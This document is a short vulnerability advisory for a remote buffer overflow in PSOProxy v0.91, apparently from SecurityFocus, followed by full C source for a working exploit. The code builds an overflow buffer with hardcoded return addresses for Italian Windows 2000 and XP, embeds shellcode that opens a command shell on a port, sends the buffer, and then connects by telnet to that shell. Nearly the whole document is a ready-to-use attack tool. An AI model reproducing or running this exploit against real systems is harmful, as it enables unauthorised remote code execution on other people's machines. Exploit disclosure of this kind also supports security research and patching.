source: http://www.securityfocus.com/bid/9706/info
  
It has been reported that PSOProxy is prone to a remote buffer overflow vulnerability. The issue is due to the insufficient boundary checking.
  
A malicious user may exploit this condition to potentially corrupt sensitive process memory in the affected process and ultimately execute arbitrary code with the privileges of the web server. 

/*******************************************************
*  PSO v0.91 Remote exploit                            *
*  by NoRpiUs                                          *
*                                                      *
*  web: www.norpius.tk                                 *
*  email: norpius@altervista.org                       *
*                                                      *
*******************************************************/ 

#include <stdio.h>
#ifdef WIN32
    #include <winsock.h>
    #include <windows.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

unsigned char shellcode[] = 

  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89\x41\r\n";


void errore( char *err )
{
	printf("%s",err);
	exit(1);
}

void connectz( char *host)
{
	char comando[30000];
	sleep(5000);
	sprintf(comando, "telnet %s 28876", host);
	system(comando);
}

void banner(void)
{
	fputs("\n\tPSO Remote exploit\n"
	      "\tBy NoRpiUs\n"
	      "\tweb: www.norpius.tk\n"
	      "\temail: norpius@altervista.org\n\n", stdout);
}

void uso( char *progz )
{	
	printf("Uso: <host> <porta> <target>\n\n");
	printf("\tTarget:             \n"
               "\t1 = Win2k ITA SP4   \n"
               "\t2 = WinXP ITA SP0(1)\n"
               "\t3 = WinXP ITA SP0(2)\n");
	exit(1);
}

int main( int argc, char *argv[] )
{
	int sock;
	struct hostent *he;
	struct sockaddr_in target;
	unsigned char evilbuff[1530];
	long retaddr1 = 0x796C7DDC;   
        long retaddr2 = 0x77E7FC79; 
        long retaddr3 = 0x77EB1933;    

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(2,0), &wsadata);
#endif

	banner();
	if ( argc < 4 ) uso(argv[0]);

	if ( (he = gethostbyname(argv[1])) == NULL )
		errore("\t[-] Impossibile risolvere l'host\n");

	target.sin_family = AF_INET;
	target.sin_addr   = *(( struct in_addr *) he -> h_addr );
	target.sin_port   = htons(atoi(argv[2]));

	fputs("\t[+] Preparazione del buffer...\n", stdout);

	memset(evilbuff, 0x41, 1040 );
	
        switch(argv[3][0]) 
        {
                case '1': memcpy(evilbuff + 1024, (unsigned char *) &retaddr1, 4); break;
                case '2': memcpy(evilbuff + 1024, (unsigned char *) &retaddr2, 4); break;
                case '3': memcpy(evilbuff + 1024, (unsigned char *) &retaddr3, 4); break;
                default : errore("[-] Target sbagliato\n");                       
        }
	
	memcpy(evilbuff + 1040, shellcode, sizeof(shellcode)); 
	
	fputs("\t[+] Connessione...\n", stdout);

	if ( (sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP )) < 0 )
		errore("\t[-] Impossibile creare socket\n");

	if ( connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0 )
		errore("\t[-] Connessione fallita\n");

	if ( send( sock, evilbuff, sizeof(evilbuff), 0) < 0 )
		errore("\t[-] Impossibile spedire il buffer\n");

	close(sock);

	fputs("\t[+] Buffer spedito!\n", stdout);
	fputs("\t[+] In attesa della connessione...\n\n", stdout);

	connectz(argv[1]);

	return(0);

}

	
	
